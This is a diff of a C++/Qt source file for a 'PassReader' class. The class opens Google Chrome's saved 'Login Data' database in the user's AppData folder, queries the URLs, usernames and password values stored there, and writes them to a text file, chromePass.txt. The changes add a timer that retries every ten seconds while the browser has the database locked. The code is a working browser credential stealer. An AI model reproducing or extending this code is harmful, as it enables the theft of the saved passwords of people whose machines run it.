@@ -1,45 +1,63 @@
+#include <windows.h>
+
+#include <QDebug>
+#include <QtSql/QSqlQuery>
+
 #include "passReader.h"
 
-PassReader::PassReader(QObject* parent): QObject(parent)
-{
-    path = new QString(QDir::currentPath());
-}
-
-PassReader::PassReader(QObject* parent, QString &str): QObject(parent)
-{
-    path = new QString(str);
-}
-
-PassReader::~PassReader()
-{
-    delete path;
-}
-
-bool PassReader::readPass()
+PassReader::PassReader(QObject* parent, const QString &str):
+    QObject(parent),
+    path(str)
 {
     setlocale(LC_CTYPE, "rus");
 
-    //Output file
-    QString filePath = *path + '/' + "chromePass.txt";
-    QFile file(filePath);
-    file.open(QIODevice::WriteOnly);
-
-    //Open DB
-    QSqlDatabase db;
-    db = QSqlDatabase::addDatabase("QSQLITE");
+    timer = new QTimer(this);
+    db = new QSqlDatabase( QSqlDatabase::addDatabase("QSQLITE", "passwords") );
 
     //Get %appdata% folder
     QString appdata = getenv("APPDATA");
     appdata.replace("\\", "/");
 
     //Destination folder
-    db.setDatabaseName(appdata + "/../Local/Google/Chrome/User Data/Default/Login Data");
+    db->setDatabaseName(appdata + "/../Local/Google/Chrome/User Data/Default/Login Data");
+}
 
-    if (db.open())
+PassReader::~PassReader()
+{
+    delete timer;
+    QSqlDatabase::removeDatabase("passwords");
+}
+
+bool const PassReader::readPass()
+{
+    //Output file
+    QString filePath = path + '/' + "chromePass.txt";
+    QFile file(filePath);
+
+    if (db->open())
     {
         //Create SQL Query, select url+login+pass
-        QSqlQuery query;
-        query.exec("SELECT origin_url, username_value, password_value FROM logins");
+        QSqlQuery query("SELECT origin_url, username_value, password_value FROM logins", *db);
+
+        //If data base is locked
+        if ( ! query.exec() )
+        {
+            qDebug() << "DB is locked";
+            db->close();
+            //Start timer
+            if ( ! timer->isActive() )
+            {
+                connect(timer, &QTimer::timeout, this, &PassReader::readPass);
+                timer->setInterval(10*1000); //10 sec
+                timer->start();
+            }
+            return false;
+        }
+        else    //Success
+        {
+            timer->stop();
+            file.open(QIODevice::WriteOnly);
+        }
 
         while (query.next())
         {
@@ -86,8 +104,13 @@ bool PassReader::readPass()
         }
     }
     else
+    {
+        qDebug() << "Error. Cannot open DB.";
+        file.close();
         return false;
+    }
 
+    db->close();
     file.close();
     emit fileSaved(filePath);
     return true;
